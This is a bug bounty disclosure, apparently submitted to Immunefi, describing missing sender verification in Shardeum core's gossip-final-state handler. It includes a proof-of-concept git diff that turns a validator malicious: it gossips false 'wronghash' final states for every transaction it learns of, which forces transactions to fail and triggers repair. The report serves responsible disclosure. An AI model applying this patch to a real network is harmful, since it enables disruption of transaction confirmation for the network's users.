# 34481 - \[BC - Critical] Bypassing sender verification in gossip-final-s...

Submitted on Aug 13th 2024 at 20:13:43 UTC by @doxtopzhivago for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34481

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The gossip-final-state gossip handler lacks incoming message verification. Consequently, this vulnerability allows various attacks, such as forcing transactions to fail or manipulating account balances after a transaction is executed.

## Vulnerability Details

During the execution of a transaction validators in the execution group exchange final account data with other nodes in the transaction group. The new consensus protocol introduces restrictions on sender, receiver and data. However, these restrictions are absent in the gossip-final-state handler, allowing control for attacker to the transaction's final state.

When a transaction is received by a malicious validator, it can send a gossip-final-state message to the validators in the transaction group with incorrect final account state information after a brief delay. This misinformation can include an incorrect hash or an incorrect final balance. If the hash is incorrect the transaction will fail since it doesn't match the hash in the vote, triggering the repair process on the nodes from the non-execution group.

## Impact Details

This vulnerability impacts any transaction executed in the network, as there is no restriction preventing an attacker from being a part of either the transaction or execution group, and gives full control over the transaction failure status.

## References

<https://github.com/shardeum/shardus-core/blob/72fba67d3a551f21368c8b0fe94f951c8f5cc4f8/src/state-manager/TransactionQueue.ts#L777>

## Proof of Concept

A patch should be applied to the malicious validator in the Shardeum-core repository. I have created a POC that allows a malicious node to fail all transactions it knows about on non-execution group nodes. Notably, the node doesn't need to be part of the transaction or execution group. This will force the repair process on these nodes.

To test the POC:

```
Create a local network with at least 2 shards (shard size 10, total nodes 20).
If the POC is not working, try increasing the timeout from 2 seconds to 3-5 seconds.
```

```
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index 057dea8a..76ae5266 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -85,6 +85,8 @@ import SocketIO from 'socket.io'
 import { nodeListFromStates, queueFinishedSyncingRequest } from '../p2p/Join'
 import * as NodeList from '../p2p/NodeList'
 import { P2P } from '@shardus/types'
+import { WrappedResponses,
+} from '../state-manager/state-manager-types'
 
 
 // the following can be removed now since we are not using the old p2p code
@@ -748,6 +750,35 @@ class Shardus extends EventEmitter {
       )
       throw new Error(e)
     })
+    Self.emitter.on('beginTransaction', async (txId) => {
+      console.log('received new transaction:', txId)
+      setTimeout(async () => {
+        console.log('fixing new transaction:', txId)        
+        try {
+          let queueEntry = this.stateManager.transactionQueue.getQueueEntrySafe(txId)
+          const stateList = []
+          for (const key of queueEntry.uniqueKeys) {
+            let data = {accountId: key, stateId: 'wronghash'}
+            stateList.push(data)        
+          }
+          if (stateList.length > 0) {
+            const payload = {txid: queueEntry.acceptedTx.txId, stateList}
+            await Comms.sendGossip(
+              'gossip-final-state',
+              payload,
+              null,
+              null,
+              queueEntry.transactionGroup,
+              false,
+              4,
+              queueEntry.acceptedTx.txId
+            )
+          }
+        } catch (error) {
+          console.log('Gossip error:', error);
+        }        
+      }, 2000);      
+    })
     Self.emitter.on('removed', async () => {
       // Omar - Why are we trying to call the functions in modules directly before exiting.
       //        The modules have already registered shutdown functions with the exitHandler.
diff --git a/src/state-manager/TransactionQueue.ts b/src/state-manager/TransactionQueue.ts
index d921d1f9..616caef7 100644
--- a/src/state-manager/TransactionQueue.ts
+++ b/src/state-manager/TransactionQueue.ts
@@ -5550,6 +5550,7 @@ class TransactionQueue {
           //insert this tx into the main queue
           this._transactionQueue.splice(index + 1, 0, txQueueEntry)
           this._transactionQueueByID.set(txQueueEntry.acceptedTx.txId, txQueueEntry)
+          Self.emitter.emit('beginTransaction', txId)
 
           /* prettier-ignore */ if (logFlags.seqdiagram) this.seqLogger.info(`0x53455105 ${shardusGetTime()} tx:${txQueueEntry.acceptedTx.txId} Note over ${NodeList.activeIdToPartition.get(Self.id)}: aging`)
 
@@ -7039,6 +7040,7 @@ class TransactionQueue {
                 /* eslint-enable security/detect-object-injection */
 
                 if (failed === true) {
+                  console.log('transaction repair initiated: ', queueEntry.acceptedTx.txId)
                   nestedCountersInstance.countEvent('stateManager', 'shrd_awaitFinalData failed')
                   this.stateManager.getTxRepair().repairToMatchReceipt(queueEntry)
                   this.updateTxState(queueEntry, 'await repair')
                                                                   
```
